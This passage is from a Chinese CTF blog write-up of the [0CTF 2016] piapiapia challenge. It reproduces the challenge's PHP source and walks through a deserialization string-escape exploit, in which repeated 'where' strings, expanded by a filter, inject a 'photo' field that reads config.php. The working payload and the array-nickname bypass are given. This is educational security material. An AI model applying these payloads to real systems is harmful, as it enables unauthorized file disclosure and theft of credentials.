+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">		die(&#x27;Login First&#x27;);	</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">		if(!preg_match(&#x27;/^\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))</span><br><span class="line">			die(&#x27;Invalid phone&#x27;);</span><br><span class="line"></span><br><span class="line">		if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;]))</span><br><span class="line">			die(&#x27;Invalid email&#x27;);</span><br><span class="line">		</span><br><span class="line">		if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[&#x27;photo&#x27;];</span><br><span class="line">		if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)</span><br><span class="line">			die(&#x27;Photo size error&#x27;);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br><span class="line">		$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">		$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">		$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">		$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>匹配是否都有传值，并且对传入的值都进行了严格的正则匹配与长度限制，最后对我们传入的文件内容进行序列化。而我们发现这个php文件包含了<code>class.php</code>，继续审计：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&#x27;config.php&#x27;);</span><br><span class="line"></span><br><span class="line">class user extends mysql&#123;</span><br><span class="line">	private $table = &#x27;users&#x27;;</span><br><span class="line"></span><br><span class="line">	public function is_exists($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &#x27;$username&#x27;&quot;;an</span><br><span class="line">		return parent::select($this-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function register($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;);</span><br><span class="line">		$value_list = Array($username, md5($password));</span><br><span class="line">		return parent::insert($this-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	public function login($username, $password) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$password = parent::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			return true;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return false;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public function show_profile($username) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		$object = parent::select($this-&gt;table, $where);</span><br><span class="line">		return $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	public function update_profile($username, $new_profile) &#123;</span><br><span class="line">		$username = parent::filter($username);</span><br><span class="line">		$new_profile = parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = &quot;username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class mysql &#123;</span><br><span class="line">	private $link = null;</span><br><span class="line"></span><br><span class="line">	public function connect($config) &#123;</span><br><span class="line">		$this-&gt;link = mysql_connect(</span><br><span class="line">			$config[&#x27;hostname&#x27;],</span><br><span class="line">			$config[&#x27;username&#x27;], </span><br><span class="line">			$config[&#x27;password&#x27;]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[&#x27;database&#x27;]);</span><br><span class="line">		mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;);</span><br><span class="line"></span><br><span class="line">		return $this-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function select($table, $where, $ret = &#x27;*&#x27;) &#123;</span><br><span class="line">		$sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;</span><br><span class="line">		$result = mysql_query($sql, $this-&gt;link);</span><br><span class="line">		return mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function insert($table, $key_list, $value_list) &#123;</span><br><span class="line">		$key = implode(&#x27;,&#x27;, $key_list);</span><br><span class="line">		$value = &#x27;\&#x27;&#x27; . implode(&#x27;\&#x27;,\&#x27;&#x27;, $value_list) . &#x27;\&#x27;&#x27;; </span><br><span class="line">		$sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function update($table, $key, $value, $where) &#123;</span><br><span class="line">		$sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;;</span><br><span class="line">		return mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function filter($string) &#123;</span><br><span class="line">		$escape = array(&#x27;\&#x27;&#x27;, &#x27;\\\\&#x27;);</span><br><span class="line">		$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;</span><br><span class="line">		$string = preg_replace($escape, &#x27;_&#x27;, $string);</span><br><span class="line"></span><br><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	public function __tostring() &#123;</span><br><span class="line">		return __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = new user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>
+
+<p>好长的类，一大堆函数，但是我们注意到<code>filter</code>中将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’全部替换成了’hacker’，这个点之后可以用来利用。</p>
+<p>最后是存在反序列化的<code>profile.php</code>文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	if($_SESSION[&#x27;username&#x27;] == null) &#123;</span><br><span class="line">		die(&#x27;Login First&#x27;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  == null) &#123;</span><br><span class="line">		header(&#x27;Location: update.php&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后这个文件就是读取了，用base64编码对上传文件进行了读取和显示。看完代码，我们知道我们要读取<code>config.php</code>中的flag数据。而读取数据的位置在photo那里，因此我们需要增加payload的长度使得<code>config.php</code>的位置被挤到photo的位置上。</p>
+<p>首先构建序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$profile[&#x27;phone&#x27;]=&#x27;12312312312&#x27;;</span><br><span class="line">$profile[&#x27;email&#x27;]=&#x27;mrl64@163.com&#x27;;</span><br><span class="line">$profile[&#x27;nickname&#x27;]=[&#x27;halo&#x27;]; //数组绕过长度限制</span><br><span class="line">$profile[&#x27;photo&#x27;]=&#x27;config.php&#x27;;</span><br><span class="line">echo serialize($profile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312312&quot;;s:5:&quot;email&quot;;s:13:&quot;mrl64@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;halo&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>PHP在反序列化时，从左往右读取数据类型及长度，且只读取其中规定长度的数据，即当数据的长度大于规定的长度，后面还有数据也不再读取，而后面不再读取的数据，就会被挤到下一个数据项中。</p>
+<p>这里需要构造超出长度的数据，将被挤出来的数据形成可以读取config.php 的数据项。首先最后一个部分的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总共有34个字符，我们要让这些字符逃逸出来，就必须让nickname部分多出34个字符，这样我们最后部分的payload被读进nickname，既然从nickname逃逸出<code>&quot;;&#125;</code>，将前面的nickname数组闭合之后，剩下的<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>就会被当作photo的部分了。</p>
+<p>我们发现where会被替换成hacker，因此每替换一次就会使长度增加一位，34个where就会增加34位。最后payload，将nickname类型改为数组并将内容改为payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过程如下：</p>
+<ol>
+<li>刚开始传入:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312312&quot;;s:5:&quot;email&quot;;s:13:&quot;mrl64@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/07cc694b9b3fc636710fa08b6922c42b&quot;;&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>此时<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>这些部分都是nickname的一部分</p>
+<ol start="2">
+<li>接着进行正则替换后，where被替换为hacker，导致再读取完第34个hacker之后就停止读取了，而<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;</code>就替代了原来upload的地位，就是photo部分，而由于最后的<code>&quot;;&#125;</code>，导致反序列化提前结束，原来的upload不被执行。</li>
+</ol>
+<p>上传，然后抓包，把nickname改为数组绕过，解base64得到flag。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最近应该是死磕反序列化这一块了，先把欢乐新春赛那题写了，接着重点刷pop，并且学习原生类应用。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-php/" rel="tag"># -web -php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/02/25/nmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%8F%8Assi%E6%B3%A8%E5%85%A5/" rel="next" title="nmap的使用及ssi注入">
+                <i class="fa fa-chevron-left"></i> nmap的使用及ssi注入
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number"></span> <span class="nav-text">Session反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%86%E8%A7%A3php-ini%E4%B8%AD%E7%9A%84Session%E8%AE%BE%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">了解php.ini中的Session设置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BA%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">Session反序列化漏洞的出现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90GCTF2017%E3%80%91PHP%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">【GCTF2017】PHP序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0-SESSION%E5%8F%98%E9%87%8F%E7%9A%84%E8%B5%8B%E5%80%BC"><span class="nav-number">4.</span> <span class="nav-text">无$_SESSION变量的赋值</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E3%80%90Jarvis-OJ%E3%80%91PHPINFO"><span class="nav-number">5.</span> <span class="nav-text">【Jarvis OJ】PHPINFO</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number"></span> <span class="nav-text">反序列化的字符串逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">反序列化基本知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E5%BB%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="nav-number">2.</span> <span class="nav-text">如何构建字符串逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0CTF-2016-piapiapia"><span class="nav-number">3.</span> <span class="nav-text">[0CTF 2016]piapiapia</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
